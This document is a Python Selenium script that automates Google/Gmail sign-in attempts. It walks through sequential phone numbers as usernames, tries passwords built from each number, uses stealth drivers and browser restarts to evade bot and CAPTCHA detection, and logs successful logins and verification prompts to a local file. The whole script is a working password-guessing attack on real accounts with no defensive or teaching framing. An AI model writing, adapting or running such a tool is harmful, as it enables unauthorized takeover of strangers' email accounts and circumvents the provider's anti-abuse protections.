import undetected_chromedriver as uc
import sys
from selenium.webdriver.common.by import By
from selenium_stealth import stealth
from selenium.common.exceptions import (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException)

sys.setrecursionlimit(999999999)
with open("myfile.txt", "r") as file:
    phn_number = file.readlines()[-1]
    
    
phn_number = int(phn_number)+1
pass_word = "0"+str(phn_number)

def run_browser():
    global driver, run_program
    chrome_options =uc.ChromeOptions()
    chrome_options.add_argument("--incognito")
    driver = uc.Chrome(use_subprocess=True, options=chrome_options )
    url="https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
    driver.set_window_size(280, 800)
    driver.set_window_position(425, 2, windowHandle ='current')
    #driver.maximize_window()
    driver.delete_all_cookies()
    driver.get(url)
    
    run_program=True
def close_browser():
    driver.quit()
    
def input_and_click():
    global phn_number2, foun_to_try
    phn_number2= '0'+ str(phn_number)
    driver.implicitly_wait(3)
    input_box=driver.find_element(By.XPATH, "//input[@aria-label='Email or phone']")#
    input_box.clear()
    driver.implicitly_wait(3)
    input_box.send_keys(phn_number2)
    driver.implicitly_wait(3)
    next_button= driver.find_element(by="id", value="identifierNext")
    driver.implicitly_wait(3)
    next_button.click()
    driver.implicitly_wait(3)
    pass_word
    foun_to_try = True

def captcha_image_f():
    global captcha_img, to_find_err, foun_to_try, phn_number
    captcha_img= driver.find_element(by="id", value="captchaimg")
    to_find_err = False
    foun_to_try= False
    driver.implicitly_wait(3)
    phn_number = int(phn_number2) + 1
    file1 = open("myfile.txt", "a")  # append mode
    file1.write("0"+ str(phn_number-1) +"  pass= " + str(pass_word) + " founded captcha \n" +"0"+ str(phn_number-1) + "\n")
    file1.close()
    driver.quit()
    run_browser()
    driver.implicitly_wait(3)
    main_program()

def find_verification():
    global verification, pass_word, phn_number
    driver.implicitly_wait(2)
    verification=driver.find_element(By.XPATH, '//span[text()="Verify it’s you"]')#
    file1 = open("myfile.txt", "a")  # append mode
    file1.write("0"+ str(phn_number) +"  pass= " + str(pass_word) + " need to verify============================\n" +"0"+ str(phn_number) + "\n")
    file1.close()
    
    url="https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
    driver.delete_all_cookies()
    driver.get(url)
    phn_number=phn_number+1
    main_program()

def find_account():
    global account_pic, pass_word, phn_number
    driver.implicitly_wait(5)
    account_pic = driver.find_element(By.XPATH, "//form[@aria-label='Search in mail']")#
    file1 = open("myfile.txt", "a")  # append mode
    file1.write("0"+ str(phn_number) +"  pass= " + str(pass_word) + "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" +"0"+ str(phn_number) + "\n")
    file1.close()
    url="https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
    driver.delete_all_cookies()
    phn_number=phn_number+1
    driver.get(url)
    
    main_program()

run_browser()
def main_program():
    global phn_number, run_program,phn_number, phn_number2
    
    
    input_and_click()
    def again_try_to_find():
        global phn_number, run_program, foun_to_try, error_button, next_button
        foun_to_try=True
        to_find_err = True
        
        def find_error():
            global error_button, captcha_img, pass_word,wrong_pass,next_button, phn_number, run_program, foun_to_try,incorrect_pass, to_find_err, pass_box, account_pic
            to_find_err = True

            try:
                driver.implicitly_wait(3)
                error_button = driver.find_element(By.CLASS_NAME, "jibhHc")
                driver.implicitly_wait(3)

                phn_number = int(phn_number2) + 1
                driver.implicitly_wait(3)
                main_program()

            except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                error_button = False
                try: 
                    driver.implicitly_wait(4)
                    #password
                    pass_box = driver.find_element(By.XPATH, "//input[@aria-label='Enter your password']")#
                    pass_word = "0"+str(phn_number)
                    pass_box.send_keys(pass_word)
                    #passwordNext
                    next_button2 = driver.find_element(by="id", value="passwordNext")
                    next_button2.click()
                    try:
                        driver.implicitly_wait(3)
                        wrong_pass = driver.find_element(By.XPATH, '//span[text()="Wrong password. Try again or click Forgot password to reset it."]')#
                        pass_word= "0" + str(phn_number)
                        pass_word = pass_word[:-3]
                        pass_box = driver.find_element(By.XPATH, "//input[@aria-label='Enter your password']")#
                        pass_box.send_keys(pass_word)
                        #passwordNext
                        next_button2 = driver.find_element(by="id", value="passwordNext")
                        next_button2.click()
                        driver.implicitly_wait(3)
                        wrong_pass = driver.find_element(By.XPATH, '//span[text()="Wrong password. Try again or click Forgot password to reset it."]')#
                        pass_word2= "0" + str(phn_number)
                        pass_word = pass_word2[-8:]
                        pass_box = driver.find_element(By.XPATH, "//input[@aria-label='Enter your password']")#
                        pass_box.clear()
                        pass_box.send_keys(pass_word)
                        #passwordNext
                        next_button2 = driver.find_element(by="id", value="passwordNext")
                        next_button2.click()
                        driver.implicitly_wait(3)
                        wrong_pass = driver.find_element(By.XPATH, '//span[text()="Wrong password. Try again or click Forgot password to reset it."]')#
                        file1 = open("myfile.txt", "a")  # append mode
                        file1.write("0"+ str(phn_number) +"  pass= " + str(pass_word) + " password not found \n" +"0"+ str(phn_number) + "\n")
                        file1.close()
                        url="https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
                        phn_number=int(phn_number)+1
                        driver.delete_all_cookies()
                        driver.get(url)
                        main_program()
                    except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                        try:
                            find_account()

                        except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                            try:
                                phn_number = phn_number
                                find_verification()
                                
                            except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                                try:
                                    captcha_image_f()
                                except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException):
                                    file1 = open("myfile.txt", "a")  # append mode
                                    file1.write("0"+ str(phn_number) +"  pass= " + str(pass_word) + " unknown error ============================================================\n" +"0"+ str(phn_number) + "\n")
                                    file1.close()
                                    phn_number = phn_number+1
                                    driver.quit()
                                    run_browser()
                                    driver.implicitly_wait(3)
                                    main_program()
                        
                except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                    try:
                        captcha_img= driver.find_element(by="id", value="captchaimg")
                        to_find_err = False
                        foun_to_try= False
                        driver.implicitly_wait(3)
                        phn_number = int(phn_number2) + 1
                        driver.quit()
                        run_browser()
                        driver.implicitly_wait(3)
                        main_program()
                    except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                        try: 
                            driver.implicitly_wait(0.2)
                            next_button= driver.find_element(by="id", value="next")
                            file1 = open("myfile.txt", "a")  # append mode
                            file1.write(phn_number2 +"\n")
                            driver.implicitly_wait(3)
                            file1.close()
                            phn_number = int(phn_number2) + 1
                            run_program = run_program + 1
                            url="https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
                            driver.get(url)
                            main_program()
                        except (NoSuchElementException,StaleElementReferenceException,ElementClickInterceptedException,ElementNotInteractableException,TimeoutException):
                            to_find_err=True


        while to_find_err:    
            find_error()
    while foun_to_try:
        again_try_to_find()
while run_program:
    main_program()

if RecursionError:
    driver.quit()
else:
    main_program()
driver.quit()